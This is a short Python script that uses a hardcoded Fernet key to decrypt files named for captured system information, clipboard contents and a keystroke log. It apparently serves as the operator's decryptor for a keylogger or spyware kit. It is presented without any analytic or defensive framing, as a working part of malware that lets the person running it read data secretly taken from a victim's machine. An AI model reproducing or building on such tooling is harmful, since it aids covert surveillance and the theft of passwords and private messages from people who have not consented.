from cryptography.fernet import Fernet

key = "mDjsfDJCeoGp6vhh8odwLZO9RJDYuf4u-_vEhfchHlQ="

system_information_e = 'e_systeminfo.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_key_log.txt'

decrypted_files = [
    'd_systeminfo.txt',
    'd_clipboard.txt',
    'd_key_log.txt'
]

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for encrypted_file, decrypted_file in zip(encrypted_files, decrypted_files):
    with open(encrypted_file, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    try:
        decrypted = fernet.decrypt(data)
        decoded_text = decrypted.decode('utf-8')
    except Exception as e:
        print(f"Error decoding {encrypted_file}: {e}")
        continue

    with open(decrypted_file, 'a') as f:
        f.write(decoded_text)

    count += 1

